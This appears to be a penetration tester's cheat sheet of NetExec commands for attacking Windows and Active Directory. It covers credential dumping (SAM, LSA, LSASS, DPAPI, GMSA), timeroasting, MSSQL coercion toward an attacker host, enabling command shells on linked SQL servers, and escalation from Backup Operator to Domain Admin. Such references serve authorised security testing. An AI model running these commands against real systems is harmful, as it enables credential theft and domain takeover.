# NetExec

{% code overflow="wrap" fullWidth="true" %}
```bash
# CHEATSHEET
https://github.com/seriotonctf/cme-nxc-cheat-sheet

# GENERATE HOSTS FILE
netexec smb $IP --generate-hosts-file /etc/hosts

# LIST MODULES
nxc mssql dc.domain.com -u user -p password -L

# What do you do if you have compromised a server administrator? Hunt for domain admins
nxc ... -M presence
nxc ... --dpapi

# Backup Operator to Domain Admin
nxc smb ... -M backup_operator

# Certificate Authentication
--pfx-cert/--pfx-base64 with --pfx-pass for PFX certificates
--pem-cert with --pem-key for PEM certificates
nxc smb $IP --pfx-cert test.pfx -u $USER
nxc smb $IP --cert-pem user.crt --key-pem user.key -u $USER

# NFS Escape to Root File System
https://www.netexec.wiki/nfs-protocol/escape-to-root-file-system

# Dumping SAM and LSA
Method that retrieves the data directly from the registry hives via the remote registry service
It is now the default in NetExec and should offer much greater stealth. 
# if you need to use the old method for some reason
--sam/--lsa secdump

# Timeroasting the Domain
request a hashed & salted version of any computer account NT hash in the domain without the need for authentication.
nxc smb $IP -M timeroast

# QWINSTA
While the --loggedon-users flag is very useful if you don't have administrative privileges yet, if you do have control over the host it can be very useful to know where users are connecting from.
NetExec uses the native qwinsta protocol implementation from Impacket to enumerate RDP sessions on the target, providing information such as the connecting IP address and session state.'
nxc smb ... --qwinsta

# Tasklist
nxc smb ... --tasklist

# SMB Share Listing Option -> list directories
nxc smb ... --shares
nxc smb ... --share My_Share --dir
# List files inside a dir
nxc smb ... --share My_Share --dir "my_folder"

# NFS Share Listing Option
The NFS protocol has a build in share listing option as well. Without specifying a share it will try to use the escape-to-root-fs and list the root of the file system.
nxc nsf $IP --shares
nxc nfs $IP --ls

# Enumerate Delegation Configurations in the Domain
nxc ldap $IP $CREDS --find-delegation

# LDAPS Channel Binding now Supported
nxc ldap $IP $CREDS -M ldap-checker

# RID Brute Force on MSSQL
It was possible from SMB before, now also with the MSSQL protocol
nxc mssql $IP $CREDS --rid-brute

# Coercing with MSSQL
Coercing connections with SMB is a well-known technique that can be achieved by using the coerce_plus module in NetExec. However, it is now also possible to coerce connections using MSSQL and the new mssql_coerce module
nxc mssql $IP $CREDS -M mssql_coerce -o L=$LHOST

# Shadow RDP Module
nxc smb $IP $CREDS -M shadowrdp -o ACTION=enable/disable

# Notepad++ Module
Find content into unsaved notepad++ documents 
nxc smb $IP $CREDS -M notepad++

# New Modules on MSSQL
enum_impersonate: List users that can be impersonated (similar to the mssql_priv module)
enum_logins: Enumerate active MSSQL logins
enum_links: Enumerate linked MSSQL servers
exec_on_link: Execute SQL queries on a linked server
link_enable_cmdshell: Enable/Disable the cmd shell on a linked server
link_xpcmd: Execute shell commands on the linked server

# Enumerate Recently Accessed Files
By default, Windows creates LNK files for recently accessed objects and stores them in the AppData\Roaming\Microsoft\Windows\Recent director
nxc smb $IP $CREDS -M recent_files

# Snipping Tool Module
Dump all screenshots done by the Windows Snipping Tool
nxc smb $IP $CREDS -M snipped

# Uploading and Downloading files with SSH
nxc ssh $IP $CREDS --put-file tests/data/test_file.txt /tmp/test_file # put the first file into the SSH server
nxc ssh $IP $CREDS --put-file /tmp/test_file testfile.txt

# Remote UAC
Useful after manual exploitation, for example, to restore the system original security (never leave a system more vulnerable than when you found it!).
nxc smb $IP $CREDS -M remote-uac -o ACTION=enable/disable

# Detect drop-the-MIC
Relaying SMB traffic to LDAP? No Problem!
With the new module remove-mic made by @XiaoliChan you can easily check if the target is vulnerable to CVE-2019-1040
nxc smb $IP $CREDS -M remove-mic

# DPAPI Hash
Extracts DPAPI 'hashes' based on the user protected master key, which can then be brute-forced with Hashcat (modes 15310 or 15900)
nxc smb $IP $CREDS --local-auth -M dpapi_hash -o "OUTPUTFILE=hashes.txt"

# Automatically Generate Hosts File
nxc smb $IP $CREDS --generate-hosts-file /tmp/hosts

# Automatically Generate KRB5 File
nxc smb $IP $CREDS --generate-krb5-file /tmp/krb5

# GMSA
nxc smb $IP $CREDS --gmsa

# Dump hashes
# SAM
nxc smb $IP $CREDS --sam secdump
# LSASS
nxc smb $IP $CREDS -M lsassy
# LSA (Requires Domain Admin or Local Admin Priviledges on target Domain Controller)
nxc smb $IP $CREDS --lsa

https://www.netexec.wiki/news/v1.4.0-smoothoperator#tasklist
```
{% endcode %}
